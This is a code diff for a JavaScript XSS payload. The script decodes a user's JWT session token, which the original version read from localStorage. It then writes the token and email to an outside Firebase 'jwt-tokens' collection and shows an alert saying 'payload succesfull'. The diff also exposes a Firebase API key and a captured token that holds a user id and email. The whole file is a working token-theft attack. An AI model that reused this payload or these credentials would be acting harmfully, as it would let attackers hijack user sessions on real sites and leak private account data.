@@ -1,7 +1,13 @@
-// Import the functions you need from the SDKs you need
-import { initializeApp } from "firebase/app";
-import { getFirestore, addDoc, collection } from "firebase/firestore";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import {
+  getFirestore,
+  addDoc,
+  collection,
+} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+// import { Link } from "https://unpkg.com/react-router-dom@5.0.0/umd/react-router-dom.min.js";
 
+initReact();
+// const navigate = useNavigate();
 // Your web app's Firebase configuration
 const firebaseConfig = {
   apiKey: "AIzaSyDvix46PGrqV4sIW3tlj-fLlb6mbuDVHj8",
@@ -16,24 +22,56 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-const userToken = localStorage.token;
+function parseJwt(token) {
+  var base64Url = token.split(".")[1];
+  var base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
+  var jsonPayload = decodeURIComponent(
+    window
+      .atob(base64)
+      .split("")
+      .map(function (c) {
+        return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
+      })
+      .join("")
+  );
+
+  return JSON.parse(jsonPayload);
+}
+
+const userToken =
+  "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3MDUyMzEsImVtYWlsIjoiZ3Vlc3RfdXNlcl9RUk00TklAYXNzZXNzcHJlcC5jb20iLCJobWFjIjoiN2M4NGFmZjE5YTUwYmQ5MzFhMmY4NDE3MTgxNWNkMzQxMWZhNGUyNjc1YzBlODk4ZDU3NzA5ZjM4MTJiOGRkYiIsImV4cCI6MTcwNTA0NTYzNSwiYXQiOjE3MDQxODE2MzUsInV1aWQiOiIwMUhLMzI5VkpDRjFBU0FLTVE4QTZIVFJQSCIsImNyZWF0ZWRfYXQiOiIyMDI0LTAxLTAyIDA3OjQ3OjE1IFVUQyJ9.DBpQQvdWIEuCR6pmo03ffHDt8An9XuxXsRzvDiUGTC8";
 const decodedTokenPayload = parseJwt(userToken);
 
-try {
-  const docRef = await addDoc(collection(db, "jwt-tokens"), {
-    email: decodedTokenPayload?.email,
-    token: userToken,
-  });
+const redir = () => {};
 
-  console.log("Document written with ID: ", docRef.id);
-} catch (e) {
-  console.error("Error adding document: ", e);
-} finally {
-  stage2();
+const sToken = async () => {
+  try {
+    const docRef = await addDoc(collection(db, "jwt-tokens"), {
+      email: "XSS",
+      token: userToken,
+    });
+
+    console.log("Document written with ID: ", docRef.id);
+  } catch (e) {
+    console.error("Error adding document: ", e);
+  } finally {
+    redir();
+  }
+};
+
+function initReact() {
+  const CDNLinks = [
+    "https://unpkg.com/react@16.3.1/umd/react.production.min.js",
+    "https://unpkg.com/react-dom@16.3.1/umd/react-dom.production.min.js",
+    "https://unpkg.com/react-router-dom@6/umd/react-router-dom.min.js",
+  ];
+  for (let i in CDNLinks) {
+    console.log("creating script for", CDNLinks[i]);
+    let script_tag = document.createElement("script");
+    script_tag.src = CDNLinks[i];
+    document.head.appendChild(script_tag);
+  }
 }
+alert("payload succesfull");
 
-function stage2() {}
-
-function parseJwt(token) {
-  return JSON.parse(Buffer.from(token.split(".")[1], "base64").toString());
-}
+sToken();
